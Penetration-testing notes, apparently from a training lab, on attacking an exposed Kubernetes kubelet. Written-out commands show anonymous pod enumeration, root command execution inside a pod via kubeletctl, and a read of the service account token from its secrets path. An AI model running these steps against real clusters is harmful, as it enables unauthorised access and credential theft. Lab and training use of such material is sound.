readme.md


<a id="orgd2e9406"></a>

### K8's API Server Interaction

    curl https://10.129.10.11:6443 -k
    {
            "kind": "Status",
            "apiVersion": "v1",
            "metadata": {},
            "status": "Failure",
            "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
            "reason": "Forbidden",
            "details": {},
            "code": 403
    }

`System:anonymous` typically represents an unauthenticated user, meaning we haven't provided valid credentials or are trying to access the API server anonymously. In this case, we try to access the root path, which would grant significant control over the Kubernetes cluster if successful. By default, access to the root path is generally restricted to authenticated and authorized users with administrative privileges and the API server denied the request, responding with a `403 Forbidden` status code accordingly.


<a id="orgaace85a"></a>

### Kubelet API - Extracting Pods

    curl https://10.129.10.11:10250/pods -k | jq .
    
    ...SNIP...
    {
      "kind": "PodList",
      "apiVersion": "v1",
      "metadata": {},
      "items": [
        {
          "metadata": {
            "name": "nginx",
            "namespace": "default",
            "uid": "aadedfce-4243-47c6-ad5c-faa5d7e00c0c",
            "resourceVersion": "491",
            "creationTimestamp": "2023-07-04T10:42:02Z",
            "annotations": {
                "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"nginx\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"imagePullPolicy\":\"Never\",\"name\":\"nginx\",\"ports\":[{\"containerPort\":80}]}]}}\n",
              "kubernetes.io/config.seen": "2023-07-04T06:42:02.263953266-04:00",
              "kubernetes.io/config.source": "api"
            },
            "managedFields": [
              {
                "manager": "kubectl-client-side-apply",
                "operation": "Update",
                "apiVersion": "v1",
                "time": "2023-07-04T10:42:02Z",
                "fieldsType": "FieldsV1",
                "fieldsV1": {
                  "f:metadata": {
                    "f:annotations": {
                      ".": {},
                      "f:kubectl.kubernetes.io/last-applied-configuration": {}
                    }
                  },
                  "f:spec": {
                    "f:containers": {
                      "k:{\"name\":\"nginx\"}": {
                        ".": {},
                        "f:image": {},
                        "f:imagePullPolicy": {},
                        "f:name": {},
                        "f:ports": {
                                            ...SNIP...

The information displayed in the output includes the `names`, `namespaces`, `creation timestamps`, and `container images` of the pods. It also shows the `last applied configuration` for each pod, which could contain confidential details regarding the container images and their pull policies.


<a id="org38b5f90"></a>

### Kubeletctl - Extracting Pods

    kubeletctl -i --server 10.129.10.11 pods
    
    ┌────────────────────────────────────────────────────────────────────────────────┐
    │                                Pods from Kubelet                               │
    ├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
    │   │ POD                                │ NAMESPACE   │ CONTAINERS              │
    ├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
    │ 1 │ coredns-78fcd69978-zbwf9           │ kube-system │ coredns                 │
    │   │                                    │             │                         │
    ├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
    │ 2 │ nginx                              │ default     │ nginx                   │
    │   │                                    │             │                         │
    ├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
    │ 3 │ etcd-steamcloud                    │ kube-system │ etcd                    │
    │   │                                    │             │                         │
    ├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤

To effectively interact with pods within the Kubernetes environment, it's important to have a clear understanding of the available commands. One approach that can be particularly useful is utilizing the `scan rce` command in `kubeletctl`. This command provides valuable insights and allows for efficient management of pods.


<a id="orgff9aaca"></a>

### Kubelet API - Available Commands

    kubeletctl -i --server 10.129.10.11 scan rce
    
    ┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
    │                                   Node with pods vulnerable to RCE                                  │
    ├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
    │   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
    ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
    │   │              │                                    │             │                         │ RUN │
    ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
    │ 1 │ 10.129.10.11 │ nginx                              │ default     │ nginx                   │ +   │
    ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
    │ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
    ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤

It is also possible for us to engage with a container interactively and gain insight into the extent of our privileges within it. This allows us to better understand our level of access and control over the container's contents.


<a id="org1827051"></a>

### Kubelet API - Executing Commands

    kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
    
    uid=0(root) gid=0(root) groups=0(root)

The output of the command shows that the current user executing the `id` command inside the container has root privileges. This indicates that we have gained administrative access within the container, which could potentially lead to privilege escalation vulnerabilities. If we gain access to a container with root privileges, we can perform further actions on the host system or other containers.


<a id="org38020a0"></a>

### Privilage Escalation

To gain higher privileges and access the host system, we can utilize a tool called [kubeletctl](https://github.com/cyberark/kubeletctl) to obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server. To do this, we must provide the server's IP address, namespace, and target pod. In case we get this token and certificate, we can elevate our privileges even more, move horizontally throughout the cluster, or gain access to additional pods and resources.

1.  Kubelet API - Extracting Tokens

        kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
        
        eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
